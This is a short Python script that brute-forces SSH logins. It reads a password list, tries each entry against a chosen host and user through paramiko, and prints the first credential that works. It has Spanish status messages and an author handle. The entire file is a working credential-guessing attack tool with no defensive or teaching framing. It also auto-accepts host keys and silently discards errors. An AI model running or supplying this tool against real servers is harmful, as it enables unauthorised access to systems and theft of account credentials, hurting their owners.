#!/usr/bin/env python3
# @wvverez
import paramiko
import argparse

p = argparse.ArgumentParser()
p.add_argument('-t', '--target', required=True)
p.add_argument('-u', '--user', required=True)
p.add_argument('-p', '--passwords', required=True)
p.add_argument('-v', '--verbose', action='store_true')
a = p.parse_args()

for pw in open(a.passwords):
    pw = pw.strip()
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if a.verbose: print(f"[*] Probando {a.user}:{pw}")
    try:
        c.connect(a.target, username=a.user, password=pw)
        print(f"[+] {a.user}:{pw}")
        break
    except: pass
